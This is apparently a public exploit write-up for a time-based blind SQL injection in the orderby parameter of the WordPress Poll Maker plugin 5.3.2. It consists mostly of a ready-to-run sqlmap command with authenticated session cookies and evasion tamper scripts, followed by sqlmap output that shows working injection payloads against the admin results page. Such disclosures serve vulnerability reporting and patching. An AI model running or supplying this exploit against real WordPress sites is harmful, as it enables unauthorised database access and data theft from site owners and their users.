### Exploit Title: WordPress Poll Maker Plugin SQL Injection 
### Date: 2024-07-11
### Exploit Author: tmrswrr
### Category : Webapps
### Vendor: https://ays-pro.com/wordpress/poll-maker
### Version 5.3.2

1. **Access the Admin Panel:**
   - Navigate to the admin panel of your WordPress site.
   - Go to `Poll Maker`  > `Results` > https://localhost/wordpress/wp-admin/admin.php?page=poll-maker-ays-results&orderby=id&order=desc
     
3. Search for orderby parameter.

## SQLMAP COMMAND

python3 sqlmap.py -u "https://localhost/wordpress/wp-admin/admin.php?page=poll-maker-ays-results&orderby=id&order=desc" --cookie="wordpress_logged_in_55e28812cb0bc43705127d62a25df794=admin|1720624086|cQgkhpgoy0ZxhQSupSHRw7bo9mxcwEWyUp0VreNnZBK|d74e12a1cdecafc50c920c18d4711826598780dd360f3a637abcc68a6086f7a3; _wp_travel_engine_session=010869411d3c5e302ccf674d9a49d453||1720689253||1720688893; wordpress_logged_in_d31d6d9d0bfd834c03c5a471886561f0=admin|1720860313|TGYBq5U4ro5vSY5QpssgjpPJi4EmsOJQqWjLKD77XaV|81237d448295de9d99b8560e6b6d9d8640f81c4dbb629e550e56860775baf0b3; wordpress_sec_d31d6d9d0bfd834c03c5a471886561f0=admin|1720860313|TGYBq5U4ro5vSY5QpssgjpPJi4EmsOJQqWjLKD77XaV|d8d2e1da10a83ab054e39b8dfa5787c0dc2d586f364bcb584983b26efb857285; wordpress_test_cookie=WP Cookie check; wp-settings-1=editor=html; wp-settings-time-1=1720687513" --batch --dbms=mysql --threads=10 --no-cast --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 

## RESULT

Parameter: orderby (GET)
    Type: time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: page=poll-maker-ays-results&orderby=id PROCEDURE ANALYSE(EXTRACTVALUE(3054,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x58655778))))),1)# wcUc&order=desc
    Vector: PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)
---

---
[08:03:59] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[08:03:59] [INFO] the back-end DBMS is MySQL
[08:03:59] [PAYLOAD] id/**/PrOCEdUrE/**/analySE(exTRActvALuE(6707,CoNcAT(0x5c,(iF((VeRSION()/**/LikE/**/0x254d61726961444225),BenChmaRk(5000000,MD5(0x6e454541)),6707)))),1)#/**/ZrRh
[08:03:59] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[08:04:01] [DEBUG] used the default behavior, running in batch mode
web application technology: Apache 2.4.54, PHP 8.0.23
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)



